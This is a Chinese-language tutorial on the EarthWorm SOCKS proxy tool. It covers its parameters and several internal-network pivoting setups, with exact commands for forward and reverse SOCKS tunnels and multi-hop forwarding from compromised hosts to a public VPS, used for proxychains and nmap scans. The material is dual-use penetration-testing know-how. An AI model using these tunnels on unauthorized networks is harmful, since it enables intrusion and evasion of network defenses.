## 软件介绍

EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 专有主页：
<http://rootkiter.com/EarthWorm/>

![1609517148_5fef485c495d8c151382c.png!small?1609517151813](https://image.3001.net/images/20210102/1609517148_5fef485c495d8c151382c.png!small?1609517151813)

## 参数说明

> -l listenport open a port for the service startup. // 为服务启动打开一个端口。  
> -d refhost set the reflection host address. // 设置反连主机地址。  
> -e refport set the reflection port. // 设置反连端口。  
> -f connhost set the connect host address . // 设置连接主机地址。  
> -g connport set the connect port. // 设置连接端口。
>
> -t usectime set the milliseconds for timeout. The default value is 1000
>
> // 设置超时的毫秒数。默认值值为1000
>
> -s state setup the function. // 状态设置功能。

六种链路状态，通过 -s 参数选定，分别为:

> ssocksd rcsocks rssocks
>
> lcx_slave lcx_tran lcx_listen

其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。

lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。

lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。

lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。

lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。

通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。

## 使用场景

### 普通网络环境

1\. 目标网络边界存在公网IP且可任意开监听端口：

![1609511710_5fef331e753bd9e9b66b8.png!small](https://image.3001.net/images/20210101/1609511710_5fef331e753bd9e9b66b8.png!small)

a)失陷服务器运行

> ./ew -s ssocksd -l 8888
>
> // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理

b) Kali 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理

c) 这里使用proxychains，socks配置为1.1.1.1 8888，配合nmap扫描内网

2\. 目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理

需要一台公网vps和一台可控内网主机

![1609512914_5fef37d296d0def0740d1.png!small?1609512917023](https://image.3001.net/images/20210101/1609512914_5fef37d296d0def0740d1.png!small?1609512917023)

a) 运行

> ./ew -s rcsocks -l 1080 -e 8888
>
> // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机

b) 运行

> ./ew -s rssocks -d 1.1.1.1 -e 8888
>
> // 将目标网络的可控边界主机反向连接公网主机

c) kali可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务

### 二重网络环境：

1\. 获得目标网络内两台主机 A、B 的权限，情况描述如下：

A 主机： 存在公网 IP，且自由监听任意端口，无法访问特定资源

B 主机： 目标网络内部主机，可访问特定资源，但无法访问公网

A 主机可直连 B 主机

![1609514514_5fef3e1285bc564724495.png!small?1609514516983](https://image.3001.net/images/20210101/1609514514_5fef3e1285bc564724495.png!small?1609514516983)

  

a) 运行

> ./ew -s ssocksd -l 9999
>
> // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理

b) 运行

> ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
>
> // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机

c) kali 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。

2\. 获得目标网络内两台主机 A、B 的权限，情况描述如下：

A 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。

B 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。

A 主机可直连 B 主机，需要一台公网vps

![1609516407_5fef4577e8dbd2fb731a2.png!small?1609516410547](https://image.3001.net/images/20210101/1609516407_5fef4577e8dbd2fb731a2.png!small?1609516410547)

|HackTools| ->> | 1080 -> 1.1.1.1 -> 8888 | 防火墙 | <\-- 2.2.2.2 --> | ->> |
9999 -> 2.2.2.3 |

a) 运行

> ./ew -s lcx_listen -l 1080 -e 8888
>
> // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机

b) 运行

> ./ew -s ssocksd -l 9999
>
> // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理

c) 运行

> ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
>
> // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道

d) kali 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理

### 本地三级跳

> ./ew -s rcsocks -l 1080 -e 8888
>
> ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
>
> ./ew -s lcx_listen -l 9999 -e 7777
>
> ./ew -s rssocks -d 127.0.0.1 -e 7777

![1609518835_5fef4ef3efb6181e5e1f2.png!small?1609518838463](https://image.3001.net/images/20210102/1609518835_5fef4ef3efb6181e5e1f2.png!small?1609518838463)

  

